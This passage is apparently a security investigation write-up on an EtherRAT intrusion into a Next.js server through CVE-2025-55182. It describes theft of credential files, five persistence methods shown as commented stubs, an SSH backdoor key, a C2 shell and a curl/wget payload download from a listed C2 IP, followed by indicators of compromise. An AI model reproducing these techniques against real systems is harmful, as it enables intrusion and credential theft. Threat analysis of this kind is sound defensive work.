+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">Stage 1: Sensitive File Theft
+    <div id="stage-1-sensitive-file-theft" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-1-sensitive-file-theft" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The next payload systematically searched for sensitive files (<code>.aws/credentials</code>, <code>id_rsa</code>, <code>.env</code>, etc.) and scanned command history for critical keywords like password, secret, api_key, and aws_access. This data was exfiltrated to a <code>/crypto/keys</code> endpoint.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1184"
+    height="393"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-16_hu_b6ecc26fae38756b.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-16_hu_b6ecc26fae38756b.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-16.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-16.png"></figure>
+</p>
+
+<h4 class="relative group">Stage 2: Deep Persistence
+    <div id="stage-2-deep-persistence" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-2-deep-persistence" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The third payload firmly entrenched the malware by executing 5 distinct persistence functions:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kd">function</span> <span class="nx">persistSystemd</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1">// creates a user-level systemd service with a randomized name to execute the implant   
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">// on system startup and automatically restart it if it gets killed
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="kd">function</span> <span class="nx">persistXDG</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1">// drops a hidden .desktop file into the user&#39;s autostart directory (~/.config/autostart/) 
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">// to execute the payload whenever a graphical desktop session is launched
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="kd">function</span> <span class="nx">persistCron</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">// injects an @reboot directive into the user&#39;s crontab to silently launch 
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1">// the malware in the background every time the system reboots.
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="kd">function</span> <span class="nx">persistBashrc</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="c1">// appends a &#39;nohup&#39; background execution command to ~/.bashrc, 
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="c1">// triggering the malware every time the user opens a new interactive bash terminal.
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="kd">function</span> <span class="nx">persistProfile</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="c1">// appends a background execution command to ~/.profile, 
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="c1">// ensuring the malware runs whenever the user logs into a new shell session.
+</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>The success of these installations was reported back in a comprehensive JSON bundle.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;persistence&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nt">&#34;timestamp&#34;</span><span class="p">:</span> <span class="s2">&#34;2026-02-10T18:38:05.784Z&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nt">&#34;botId&#34;</span><span class="p">:</span> <span class="s2">&#34;4ebfbc8aedf60511&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="nt">&#34;methods&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="nt">&#34;systemd&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">      <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/home/maromalix/.config/systemd/user/c16a536e1a9cb42d.service&#34;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nt">&#34;xdg&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">      <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">      <span class="nt">&#34;path&#34;</span><span class="p">:</span> <span class="s2">&#34;/home/maromalix/.config/autostart/a5eae68533ea066c.desktop&#34;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nt">&#34;cron&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">      <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nt">&#34;bashrc&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">      <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nt">&#34;profile&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">      <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">Stage 3: SSH Backdoor
+    <div id="stage-3-ssh-backdoor" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-3-ssh-backdoor" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>To guarantee alternative administrative access, the malware installed an SSH backdoor by appending the attacker&rsquo;s public RSA key to the victim&rsquo;s ~/.ssh/authorized_keys file under the comment <code>maromalix@ether_dev</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kr">const</span> <span class="nx">ATTACKER_KEY</span> <span class="o">=</span> <span class="s1">&#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFkH2PJL8n1LJP+vqMkHxVMPLfr4KrMFCnV4sJnQ6L4aNLMzFPWYpKg1McV6rqXGLLPpVFGM/+gJPLEpHbKnPvxIgZ4RhdeXk+M4O/vpTMMEMPqMGF8P3VcBaLBgqE3WDREF4XGZ9OWf7L8lUCPU7Q0C4hrbJrq3NF1c+QHRZBOJpx0z5m5F7W8QK8kbKnHBHqMkMd8dQ4F1c+KKtF3I3A2LCMsALBPMcGVbZd1O9B3KWL4r2q9V6R7BwFo8h1h1x1c1x1h1F8o8k1b1w1r1p1v1o1i1e1w maromalix@ether_dev&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kr">const</span> <span class="nx">KEY_FINGERPRINT</span> <span class="o">=</span> <span class="s1">&#39;SHA256:1RquAvdtW48Ken6IVUZi/o4liu1SXlvezhgjb2fnvBg&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kd">function</span> <span class="nx">installSSHKey</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1">// appends the attacker&#39;s public RSA key to the 
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1">// user&#39;s ~/.ssh/authorized_keys file with maromalix@ether_dev comment
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="kd">function</span> <span class="nx">exfil</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1">// makes POST requset to /BotId endpoint with results
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">Stage 4: Interactive Shell
+    <div id="stage-4-interactive-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-4-interactive-shell" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The attacker then dropped an interactive JSON-based shell execution module, allowing them to route arbitrary commands through the C2 and read the output.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="692"
+    height="687"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-17.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-17.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-17.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-17.png"></figure>
+</p>
+
+<h4 class="relative group">Covering Tracks
+    <div id="covering-tracks" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#covering-tracks" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>In a final, highly calculated move, the attacker wiped the existing Next.js installation and forcibly upgraded the server to version <code>15.3.9</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">grep version /home/maromalix/app/node_modules/next/package.json <span class="p">|</span> head -1
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="nb">cd</span> /home/maromalix/app <span class="o">&amp;&amp;</span> rm -rf node_modules .next package-lock.json <span class="o">&amp;&amp;</span> npm install next@15.3.9 --save --legacy-peer-deps <span class="o">&amp;&amp;</span> npm install --include<span class="o">=</span>dev --legacy-peer-deps 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tail -3
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nb">cd</span> /home/maromalix/app <span class="o">&amp;&amp;</span> npm run build 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> tail -5</span></span></code></pre></div></div>
+<p>By patching the very vulnerability (CVE-2025-55182) they used to gain entry, the attacker effectively locked the door behind them, preventing competing threat actors or automated scanners from discovering and compromising their newly established foothold.</p>
+
+<h3 class="relative group"><span class="hl">IOCs</span>
+    <div id="iocs" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#iocs" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Type</th>
+          <th>Value</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>IP</td>
+          <td><em>63.180.69.24</em></td>
+          <td>Source of CVE-2025-55182 exploitation</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>91.215.85.42</em></td>
+          <td>Primary EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>63.176.62.199</em></td>
+          <td>Fallback EtherRAT C2 and payload delivery server</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>15.116.46.18</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>3.78.187.211</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>3.66.227.157</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>52.59.200.147</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>3.78.229.44</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>18.198.1.194</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>63.179.143.20</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>35.159.53.179</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>3.125.41.44</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>IP</td>
+          <td><em>3.125.39.195</em></td>
+          <td>Fallback EtherRAT C2</td>
+      </tr>
+      <tr>
+          <td>Contract</td>
+          <td>0x22f96d61cf118efabc7c5bf3384734fad2f6ead4`</td>
+          <td>Primary Ethereum C2 Resolver Contract</td>
+      </tr>
+      <tr>
+          <td>Contract</td>
+          <td>0xb0cbaA51b3D1D36e8E95F4F68dfBd47ED2eaA7a4`</td>
+          <td>Fallback Ethereum C2 Resolver Contract</td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td>s.sh`</td>
+          <td>Stage 1 Bash setup and keylogger script</td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td>.kxnzl4mtez.js</td>
+          <td>Stage 2 JavaScript Dropper</td>
+      </tr>
+      <tr>
+          <td>File</td>
+          <td>.7vfgycfd01.js</td>
+          <td>Stage 3 Main EtherRAT Implant</td>
+      </tr>
+      <tr>
+          <td>Path</td>
+          <td>/tmp/.font-unix/.fontconfig</td>
+          <td>Malicious TLS hook script</td>
+      </tr>
+      <tr>
+          <td>Path</td>
+          <td>/tmp/.font-unix/.cache</td>
+          <td>Stolen SSL/TLS master secrets file</td>
+      </tr>
+      <tr>
+          <td>Key</td>
+          <td>a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5</td>
+          <td>AES-256-CBC Decryption Key</td>
+      </tr>
+      <tr>
+          <td>SSH Key</td>
+          <td>maromalix@ether_dev</td>
+          <td>Attacker&rsquo;s unauthorized public key in authorized_keys</td>
+      </tr>
+  </tbody>
+</table>
+
+<h3 class="relative group"><span class="hl">Attack Timeline</span>
+    <div id="attack-timeline" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#attack-timeline" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<pre class="not-prose mermaid">
+%%{init: {'theme': 'base', 'themeVariables': { 'background': '#ffffff', 'mainBkg': '#ffffff', 'primaryTextColor': '#000000', 'lineColor': '#333333', 'clusterBkg': '#ffffff', 'clusterBorder': '#333333'}}}%%
+graph TD
+    classDef default fill:#f9f9f9,stroke:#333,stroke-width:1px,color:#000;
+    classDef access fill:#e1f5fe,stroke:#0277bd,stroke-width:2px,color:#000;
+    classDef exec fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#000;
+    classDef persist fill:#f3e5f5,stroke:#6a1b9a,stroke-width:2px,color:#000;
+    classDef c2 fill:#fff3e0,stroke:#e65100,stroke-width:2px,color:#000;
+    classDef exfil fill:#fce4ec,stroke:#880e4f,stroke-width:2px,color:#000;
+
+    A([Attacker Infrastructure]):::default --> B[Nmap SYN Decoy Scan]:::access
+    B --> C[18:36 - Exploit CVE-2025-55182 via /login<br/>Next.js RSC Deserialization RCE]:::access
+    
+    subgraph Stage1 [Stage 1: Deployment]
+        C --> D[curl/wget downloads s.sh<br/>from 63.176.62.199:443]:::exec
+        D --> E[Creates hidden dir .05bf0e9b<br/>Downloads standalone Node.js]:::exec
+        E --> F[Deploys TLS Keylogger<br/>Hooks tls.connect to steal master secrets]:::persist
+    end
+
+    subgraph Stage2 [Stage 2 & 3: EtherRAT]
+        F --> G[.kxnzl4mtez.js drops<br/>Decrypts AES blob .1d5j6rm2mg2d]:::exec
+        G --> H[.7vfgycfd01.js Main Implant executes<br/>Checks locale and begins C2 resolution]:::exec
+    end
+
+    subgraph BlockchainC2 [Blockchain C2 Resolution]
+        H --> I[18:37 - RPC queries to Public Ethereum Nodes<br/>Reads Primary & Fallback Smart Contracts]:::c2
+        I --> J[Attempts Primary 91.215.85.42:3000 -> 404]:::c2
+        J --> K[Resolves to Fallback 63.176.62.199:443]:::c2
+    end
+
+    subgraph PostExploit [Post-Exploitation & Exfiltration]
+        K --> L[Downloads Recon Script<br/>Exfiltrates host config & AWS/SSH paths]:::exfil
+        L --> M[Downloads Sensitive File Searcher<br/>Exfiltrates AWS, SSH, and Env secrets]:::exfil
+        M --> N[Installs Deep Persistence<br/>systemd, XDG, cron, bashrc, profile]:::persist
+        N --> O[Installs SSH Backdoor<br/>maromalix@ether_dev in authorized_keys]:::persist
+        O --> P[Upgrades Next.js to 15.3.9<br/>Patches CVE to lock out other attackers]:::exec
+    end
+</pre>
+
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_investigations\CDEF-CallMeOnTheChain - EtherRAT\index.md"
+          data-oid-likes="likes_investigations\CDEF-CallMeOnTheChain - EtherRAT\index.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+
+      
+    </footer>
+  </article>
+
+        
+
+
+  
+
+
+
+
+
+
+<div
+  id="scroll-to-top"
+  class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200">
+  <a
+    href="#the-top"
+    class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+
+    
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
